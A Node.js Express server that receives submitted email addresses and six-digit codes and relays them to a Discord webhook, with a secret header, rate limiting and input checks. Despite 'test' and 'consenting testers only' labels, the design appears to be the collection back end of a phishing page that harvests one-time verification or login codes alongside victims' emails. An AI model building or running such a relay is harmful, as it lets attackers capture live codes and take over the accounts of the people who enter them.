// server/server.js
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const helmet = require('helmet');

const app = express();
app.use(helmet());
app.use(bodyParser.json());

// Environment variables
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK; // required
const FORWARD_SECRET = process.env.FORWARD_SECRET;   // required

if (!DISCORD_WEBHOOK) {
  console.warn('DISCORD_WEBHOOK not set. Forwarder will not post to Discord until configured.');
}
if (!FORWARD_SECRET) {
  console.warn('FORWARD_SECRET not set. Forwarder will reject requests until configured.');
}

// Build embed payloads for Discord
function buildEmbed(type, data) {
  if (type === 'signup') {
    return {
      embeds: [
        {
          title: "📨 New sign-up (test)",
          color: 3066993,
          fields: [
            { name: "Email", value: data.email || "—", inline: true },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ],
          footer: { text: "Test Sign-Up (consenting testers only)" }
        }
      ]
    };
  } else if (type === 'code') {
    return {
      embeds: [
        {
          title: "🔐 Code submitted (test)",
          color: 15105570,
          fields: [
            { name: "Email", value: data.email || "—", inline: true },
            { name: "Code", value: data.code || "—", inline: true },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ],
          footer: { text: "Test Code Entry (consenting testers only)" }
        }
      ]
    };
  }
  return { content: "Unknown event" };
}

// Simple rate-limiting placeholder (very small)
const recent = new Map();
function tooManyRequests(ip) {
  const now = Date.now();
  const windowMs = 10_000; // 10s window
  const limit = 10;
  const entry = recent.get(ip) || { t: now, c: 0 };
  if (now - entry.t > windowMs) {
    entry.t = now;
    entry.c = 1;
  } else {
    entry.c += 1;
  }
  recent.set(ip, entry);
  return entry.c > limit;
}

app.post('/api/forward-webhook', async (req, res) => {
  try {
    // Require secret header
    const headerSecret = req.header('X-Forward-Secret') || '';
    if (!FORWARD_SECRET || headerSecret !== FORWARD_SECRET) {
      return res.status(403).json({ ok: false, error: 'forbidden' });
    }

    // Basic rate limiting
    const ip = req.ip || req.connection.remoteAddress || 'unknown';
    if (tooManyRequests(ip)) {
      return res.status(429).json({ ok: false, error: 'rate_limited' });
    }

    const { type, payload } = req.body || {};
    if (!type || !payload) return res.status(400).json({ ok: false, error: 'missing type or payload' });

    // Sanitize and only accept expected fields
    const safe = {};
    if (type === 'signup') {
      safe.email = String(payload.email || '').slice(0, 200);
      if (!safe.email.includes('@')) return res.status(400).json({ ok: false, error: 'invalid email' });
    } else if (type === 'code') {
      safe.email = String(payload.email || '').slice(0, 200);
      safe.code = String(payload.code || '').slice(0, 20);
      if (!/^\d{6}$/.test(safe.code)) return res.status(400).json({ ok: false, error: 'invalid code' });
    } else {
      return res.status(400).json({ ok: false, error: 'unknown type' });
    }

    if (!DISCORD_WEBHOOK) {
      return res.status(500).json({ ok: false, error: 'webhook not configured' });
    }

    const body = buildEmbed(type, safe);
    await axios.post(DISCORD_WEBHOOK, body, { headers: { 'Content-Type': 'application/json' } });

    res.json({ ok: true });
  } catch (err) {
    console.error('Forwarder error:', err.message || err);
    res.status(500).json({ ok: false, error: err.message || 'forward failed' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Forwarder listening on ${PORT}`));
